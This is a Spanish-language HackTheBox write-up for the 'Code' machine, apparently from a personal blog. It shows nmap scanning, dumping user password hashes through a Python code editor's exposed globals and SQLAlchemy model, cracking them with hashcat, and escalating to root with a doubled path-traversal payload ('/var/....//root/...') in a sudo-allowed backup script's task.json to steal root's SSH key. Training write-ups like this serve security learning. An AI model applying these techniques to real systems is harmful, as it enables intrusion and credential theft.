---
layout: post
title:  "Writeup Code"
date:   2025-08-05
categories: [Writeup, HackTheBox]
tags: [linux, facil]
image: 
  path: /images/writeup-code/Pasted image 20250509190403.png
---

***Dificultad: Facil***

***Sistema Operativo: Linux***

---------------------------------------------------------
\
hola! hoy traigo un writeup que tenia preparado pero no habia podido publicar, pues hay que trabajar (y los pagos no esperan a nadie haha) vamos a enfrentarnos a variables de entorno peligrosas, aunque estan manipuladas para ocultarse, con un poco de investigación y conectando un par de vulnerabilidades, podemos llegar a vulnerar un servidor

## Reconocimiento:

En el directorio vamos a crear los directorios de trabajo en la carpeta de la maquina:
```bash
mkdir nmap exploits content && cd nmap
```

haremos el primer escaneo con nmap para mirar los puertos abiertos:
```bash
nmap -p- --open -sS -Pn -vvv -n --min-rate 5000  10.129.229.142 -oN puertos
```

```
Not shown: 65409 closed tcp ports (reset), 124 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
5000/tcp open  upnp    syn-ack ttl 63

Read data files from: /usr/share/nmap
```
oh! que curioso el puerto 5000 con el protocolo upnp (universal plug and play)

este es un protocolo de comunicación entre dispositivos de una red, se usa para compartir datos, este protocolo es mas usado para los videojuegos, ya que permite abrir puertos de manera dinámica y autónoma sin configuraciones manuales

veamos que información dan los puertos con los scripts básicos de reconocimiento de nmap:
```bash
nmap -p22,5000 -sCV -n -vvv 10.129.229.142 -oN objetivos
```

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrE0z9yLzAZQKDE2qvJju5kq0jbbwNh6GfBrBu20em8SE/I4jT4FGig2hz6FHEYryAFBNCwJ0bYHr3hH9IQ7ZZNcpfYgQhi8C+QLGg+j7U4kw4rh3Z9wbQdm9tsFrUtbU92CuyZKpFsisrtc9e7271kyJElcycTWntcOk38otajZhHnLPZfqH90PM+ISA93hRpyGyrxj8phjTGlKC1O0zwvFDn8dqeaUreN7poWNIYxhJ0ppfFiCQf3rqxPS1fJ0YvKcUeNr2fb49H6Fba7FchR8OYlinjJLs1dFrx0jNNW/m3XS3l2+QTULGxM5cDrKip2XQxKfeTj4qKBCaFZUzknm27vHDW3gzct5W0lErXbnDWQcQZKjKTPu4Z/uExpJkk1rDfr3JXoMHaT4zaOV9l3s3KfrRSjOrXMJIrImtQN1l08nzh/Xg7KqnS1N46PEJ4ivVxEGFGaWrtC1MgjMZ6FtUSs/8RNDn59Pxt0HsSr6rgYkZC2LNwrgtMyiiwyas=
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDiXZTkrXQPMXdU8ZTTQI45kkF2N38hyDVed+2fgp6nB3sR/mu/7K4yDqKQSDuvxiGe08r1b1STa/LZUjnFCfgg=
|   256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8Cwf2cBH9EDSARPML82QqjkV811d+Hsjrly11/PHfu
5000/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

es un editor de condigo y el servidor es un Gunicorn (un servidor python pero wsgi o web server gateway interface, se usa para facilitar conexiones entre el servidor y las aplicaciones web desarrolladas en python)

bueno, todo esto me dice que es un editor de código pero que se esta ejecutando en el servidor por el protocolo upnp, aunque tambien este protocolo es mas común en el puerto 1900, quizá sea por la configuración de la maquina

## Enumeración:

en este caso no tenemos un host, así que pasare directamente a la web

<img src="/images/writeup-code/Pasted image 20250510085835.png" alt="image">
se esta enviando código python y se esta ejecutando, seria posible enviar una revshell? posiblemente no funcione

tambien tenemos otras funcionalidades, guardar - registrarnos - logearnos - acerca de

si nos registramos, tenemos una nueva funcionalidad que nos muestra nuestro código guardado:

<img src="/images/writeup-code/Pasted image 20250510090956.png" alt="image">

si probamos:
```python
import os
print("whoami")
```
<img src="/images/writeup-code/Pasted image 20250510091212.png" alt="image">

tenemos restricciones (aquí veo que la rev shell no funcionara), así que supongo que debemos buscar el modo de enumerar el entorno

tambien me da error al correr:
```python
import subprocess
subprocess.run(["whoami"], capture_output=True, text=True).stdout
```

con un comando para enumerar funciones y variables disponibles:
```python
print(dir())
```
<img src="/images/writeup-code/Pasted image 20250510091751.png" alt="image">

esto será de enumerar con python :D 

probando algunas cosas, veo que esta restringido importar librerías

voy a intentar que imprima esos directorios que me ha mostrado:
```python
print(dir(code))
print(type(code))
```
me devuelve:
```
['__add__', '__class__', '__contains__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mod__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'capitalize', 'casefold', 'center', 'count', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'format_map', 'index', 'isalnum', 'isalpha', 'isascii', 'isdecimal', 'isdigit', 'isidentifier', 'islower', 'isnumeric', 'isprintable', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'maketrans', 'partition', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill']


<class 'str'>
```

hare los mismo con los otros:
```python
print(dir(keyword))
print(type(keyword))
print(dir(old_stdout))
print(type(old_stdout))
print(type(redirected_output))
print(dir(redirected_output))
```

probando otros comandos, el que me ha dado un resultado interesante es:
```python
print(globals())
```
## Foothole:
muestra:
```python
{'__name__': 'app', '__doc__': None, '__package__': '', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f51bfa027c0>, '__spec__': ModuleSpec(name='app', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7f51bfa027c0>, origin='/home/app-production/app/app.py'), '__file__': '/home/app-production/app/app.py', '__cached__': '/home/app-production/app/__pycache__/app.cpython-38.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'GeneratorExit': <class 'GeneratorExit'>, 'SystemExit': <class 'SystemExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'ImportError': <class 'ImportError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'OSError': <class 'OSError'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'EOFError': <class 'EOFError'>, 'RuntimeError': <class 'RuntimeError'>, 'RecursionError': <class 'RecursionError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'NameError': <class 'NameError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'AttributeError': <class 'AttributeError'>, 'SyntaxError': <class 'SyntaxError'>, 'IndentationError': <class 'IndentationError'>, 'TabError': <class 'TabError'>, 'LookupError': <class 'LookupError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ValueError': <class 'ValueError'>, 'UnicodeError': <class 'UnicodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'AssertionError': <class 'AssertionError'>, 'ArithmeticError': <class 'ArithmeticError'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'SystemError': <class 'SystemError'>, 'ReferenceError': <class 'ReferenceError'>, 'MemoryError': <class 'MemoryError'>, 'BufferError': <class 'BufferError'>, 'Warning': <class 'Warning'>, 'UserWarning': <class 'UserWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'BytesWarning': <class 'BytesWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'ConnectionError': <class 'ConnectionError'>, 'BlockingIOError': <class 'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2021 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., 'credits': Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.}, 'Flask': <class 'flask.app.Flask'>, 'render_template': <function render_template at 0x7f51bf3c1ee0>, 'render_template_string': <function render_template_string at 0x7f51bf3c1f70>, 'request': <Request 'http://10.129.229.142:5000/run_code' [POST]>, 'jsonify': <function jsonify at 0x7f51bf66bc10>, 'redirect': <function redirect at 0x7f51bf4d53a0>, 'url_for': <function url_for at 0x7f51bf4d5310>, 'session': <SecureCookieSession {'_flashes': [('message', 'Registration successful! You can now log in.'), ('message', 'Login successful!')], 'user_id': 3}>, 'flash': <function flash at 0x7f51bf4d5550>, 'SQLAlchemy': <class 'flask_sqlalchemy.extension.SQLAlchemy'>, 'sys': <module 'sys' (built-in)>, 'io': <module 'io' from '/usr/lib/python3.8/io.py'>, 'os': <module 'os' from '/usr/lib/python3.8/os.py'>, 'hashlib': <module 'hashlib' from '/usr/lib/python3.8/hashlib.py'>, 'app': <Flask 'app'>, 'db': <SQLAlchemy sqlite:////home/app-production/app/instance/database.db>, 'User': <class 'app.User'>, 'Code': <class 'app.Code'>, 'index': <function index at 0x7f51be40f8b0>, 'register': <function register at 0x7f51be40fb80>, 'login': <function login at 0x7f51be40fc10>, 'logout': <function logout at 0x7f51be40fca0>, 'run_code': <function run_code at 0x7f51be40fe50>, 'load_code': <function load_code at 0x7f51be289040>, 'save_code': <function save_code at 0x7f51be2891f0>, 'codes': <function codes at 0x7f51be2893a0>, 'about': <function about at 0x7f51be289550>}
```
después de investigar con nuestro llm favorito, vemos que este entorno esta hecho para enganar, ademas de que las clases están manipuladas para devolver strings

y tambien tenemos algo de las globals:
```python
'SQLAlchemy': <class 'flask_sqlalchemy.extension.SQLAlchemy'>, 'sys': <module 'sys' (built-in)>, 'io': <module 'io' from '/usr/lib/python3.8/io.py'>, 'os': <module 'os' from '/usr/lib/python3.8/os.py'>, 'hashlib': <module 'hashlib' from '/usr/lib/python3.8/hashlib.py'>, 'app': <Flask 'app'>, 'db': <SQLAlchemy sqlite:////home/app-production/app/instance/database.db>, 'User': <class 'app.User'>, 'Code': <class 'app.Code'>, 'index': <function index at 0x7f51be40f8b0>, 'register': <function register at 0x7f51be40fb80>, 'login': <function login at 0x7f51be40fc10>, 'logout': <function logout at 0x7f51be40fca0>, 'run_code': <function run_code at 0x7f51be40fe50>, 'load_code': <function load_code at 0x7f51be289040>, 'save_code': <function save_code at 0x7f51be2891f0>, 'codes': <function codes at 0x7f51be2893a0>, 'about': <function about at 0x7f51be289550>}
```

se esta definiendo una clase *User* en el modulo *app*, la cual esta vinculada a *SQLAlchemy* que es una biblioteca de python para mapear tablas en usa base de datos.

la clase *User* desde estar mapeando una tabla entera

si queremos ver las funciones asociadas a *User*:
```python
print(dir(User))
```
veremos:

<img src="/images/writeup-code/Pasted image 20250510105805.png" alt="image">

si probamos:
```python
print(User.query.all())
```

le estamos diciendo que haga uso de la clase, que realice la Query (que es un objeto de la librería SQLAlchemy que construye consultas a una db y como vimos lo tiene la clase User) y que nos muestre los registros de la tabla a la cual esta asociada la clase User

en este caso nos muestra que la tabla de User tiene 2 objetos:

<img src="/images/writeup-code/Pasted image 20250510105426.png" alt="image">

aunque dir nos ha mostrado o nos da una idea del contenido de la tabla, para confirmar podemos usar:
```python
print(User.__table__.columns.keys())
```

 de nuevo con la ayuda de nuestro gpt favorito, creamos un bucle que va a imprimir los atributos de cada objeto de la lista devuelta por User.query
 ```python
 print([(u.username, u.password) for u in User.query.all()])
```

<img src="/images/writeup-code/Pasted image 20250510110803.png" alt="image">

usando https://hashes.com/es/tools/hash_identifier veo que son del tipo md5:
<img src="/images/writeup-code/Pasted image 20250510114328.png" alt="image">

## SSH:
voy a romperlos con hashcat:
```bash
hashcat "user:hash"  /usr/share/wordlists/rockyou.txt -m 0 --username
```
con la opcion --username ya que tengo los nombres de usuario en el archivo

nos deja con:
```hashcat
development:759b74ce43947f5f4c91aeddc3e5bad3:development
martin:3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster
```

con esto, podría intentar iniciar sesión en la pagina y ver si hay datos almacenados


development solo tiene un test de python:
<img src="/images/writeup-code/Pasted image 20250510114903.png" alt="image">

y martin no tiene nada, puedo probar ssh, aunque no creo que development lo este, intentare primero a martin:
```bash
ssh martin@10.10.10.10
```

<img src="/images/writeup-code/Pasted image 20250510115227.png" alt="image">

enumerando, no tenemos la flag por ningún lado, lo cual es extraño

## Flag.txt:

el home del usuario solo tiene un directorio /backup el cual tiene un archivo comprimido con el home del otro usuario del sistema app-backup en el cual tampoco esta la flag, solo están los scripts de la aplicación:
<img src="/images/writeup-code/Pasted image 20250510121148.png" alt="image">

mirando que podemos ejecutar como root sin contrasena, tenemos:
<img src="/images/writeup-code/Pasted image 20250510121233.png" alt="image">
/usr/bin/backy.sh

que puede estar relacionado a los backups que se crean en nuestro directorio

el ejecutar el script, me dice que se guia por task.json para crear el backup:
<img src="/images/writeup-code/Pasted image 20250510121448.png" alt="image">

y  nos muestra un backup actualizado:
<img src="/images/writeup-code/Pasted image 20250510121516.png" alt="image">

pero dentro de este tampoco hay ninguna flag

cambien la ruta del directorio al cual se le esta haciendo el backup. solo quitando /app y dejando:
```json
{
  "destination": "/home/martin/backups/",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": [
    "/home/app-production"
  ],
  "exclude": [
    ".*"
  ]
}

```

abrimos con tar:
```bash
tar -xf archivo.tar.bz2
```

y tenemos finalmente la primera flag:

<img src="/images/writeup-code/Pasted image 20250510122211.png" alt="image">

dado que el script se ejecuta como root, podemos intentar escalar privilegios tambien con el

## Escalando Privilegios:

cambiando la ruta del json a /root/ me dice:
<img src="/images/writeup-code/Pasted image 20250510122504.png" alt="image">


mirando el script que ejecutamos backy.sh:
```bash
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```


solo remplaza los dos puntos consecutivos con nada, y tambien si se usa ../ y tambien si intentamos escapar el punto 
```code
 |= map(gsub("\\.\\./"; ""))' "$json_file")
```

despues de algunas pruebas lo que me dio resultados fue un path traversal doble y quitando el exclude:
```json
{
  "destination": "/home/martin/backups/",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": [
    "/var/....//root/root.txt"
  ]
}
```
## Root.txt:

tuve que traer la flag directamente porque el directorio entero no lo traía 

al descomprimir, tenemos la flag:
<img src="/images/writeup-code/Pasted image 20250510142309.png" alt="image">

<h6>Mas allá de la flag:</h6>

tambien si quieres dominio total, he conseguido la id_rsa para conectarnos como root con el json:
```json
{
  "destination": "/home/martin/backups/",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": [
    "/var/....//root//..ssh/id_rsa"
  ]
}
```

<img src="/images/writeup-code/Pasted image 20250510143407.png" alt="image">

en ese mismo directorio ejecutamos:
```bash
ssh root@localhost -i id_rsa
```

y listo, no necesitamos cambiar los permisos porque se mantienen igual que el original:

<img src="/images/writeup-code/Pasted image 20250510143620.png" alt="image">

------------------------------------------------------
\
nos vemos en la siguiente maquina! 

## H4ck th3 W0rld

<img src="/images/devil.jpg" style="border-radius:200px; width:100px;" alt="image">